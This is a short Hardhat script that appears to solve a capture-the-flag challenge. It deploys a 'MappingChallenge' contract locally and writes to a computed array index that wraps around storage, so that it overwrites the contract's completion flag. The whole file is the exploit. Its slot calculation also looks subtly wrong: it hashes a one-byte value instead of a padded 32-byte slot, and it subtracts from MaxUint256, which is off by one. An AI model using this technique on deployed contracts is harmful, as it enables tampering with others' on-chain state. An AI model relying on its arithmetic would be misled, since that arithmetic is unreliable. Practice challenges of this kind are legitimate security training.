const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("MappingChallenge", deployer);
  const mainContract = await MainContract.deploy();

  // set initial value
  await mainContract.set(0, 8);
  // array length is 1
  // at slot 1, we store keccak256(1) value which is the slot where the first item of the array is found

  // value slot
  const valueSlot = ethers.BigNumber.from(ethers.utils.keccak256(ethers.BigNumber.from(1).toHexString()));
  const attackSlotIdx = ethers.constants.MaxUint256.sub(ethers.BigNumber.from(valueSlot));

  await mainContract.set(attackSlotIdx, 1, { gasLimit: 30000000 });
  console.log("IS COMPLETED:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
